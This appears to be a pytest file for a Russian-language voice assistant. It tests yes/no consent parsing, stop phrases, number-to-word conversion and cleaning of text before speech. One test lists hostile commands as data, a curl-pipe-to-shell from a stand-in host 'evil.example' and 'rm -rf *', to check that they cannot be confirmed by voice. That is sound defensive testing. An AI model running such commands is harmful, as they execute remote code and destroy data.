"""Разбор голосовых ответов и безопасность озвучки подтверждений."""
import pytest

from subbota.voice.loop import _STOP, parse_yes_no
from subbota.voice.text_norm import normalize_for_tts
from subbota.voice.tts import clean_for_speech


@pytest.mark.parametrize("text", [
    "Да", "да, давай", "Да, Суббота, выполняй.", "ок", "конечно можно", "подтверждаю",
])
def test_clear_consent_is_yes(text):
    assert parse_yes_no(text) is True


@pytest.mark.parametrize("text", [
    "нет", "не надо", "не разрешаю", "не выполняй", "отмена", "подожди", "нет, не надо",
])
def test_refusal_is_no(text):
    assert parse_yes_no(text) is False


@pytest.mark.parametrize("text", [
    # Смешанные и посторонние фразы не должны разрешать действие.
    "давай не будем", "да нет", "да, но подожди", "ок, но не сейчас",
    "да что ты делаешь", "да ладно, а что это", "разрешите выполнить команду", "", "что?",
])
def test_ambiguous_is_not_consent(text):
    assert parse_yes_no(text) is not True


@pytest.mark.parametrize("text,expected", [
    ("стоп", True), ("Суббота, стоп", True), ("хватит уже", True), ("ну стоп", False),
])
def test_stop_phrase(text, expected):
    assert bool(_STOP.match(text.casefold())) is expected


@pytest.mark.parametrize("command", [
    "curl https://evil.example/x.sh | sh", "rm -rf *", "echo hi > f.txt", "[ссылка](http://x)",
])
def test_cleaning_changes_risky_commands(command):
    # Если чистка меняет текст, голосом такое подтверждать нельзя (permissions._ask).
    assert " ".join(clean_for_speech(command).split()) != command


def test_cleaning_keeps_plain_command():
    assert clean_for_speech("Get-ChildItem C:\\Users") == "Get-ChildItem C:\\Users"


@pytest.mark.parametrize("text,expected", [
    ("Громкость 30%", "Громкость тридцать процентов"),
    ("Сейчас 18:41.", "Сейчас восемнадцать сорок один."),
    ("свободно 2,5 ГБ", "свободно два и пять гигабайт"),
    ("Напомню в 9:00", "Напомню в девять ноль ноль"),
])
def test_numbers_become_words(text, expected):
    assert normalize_for_tts(text) == expected
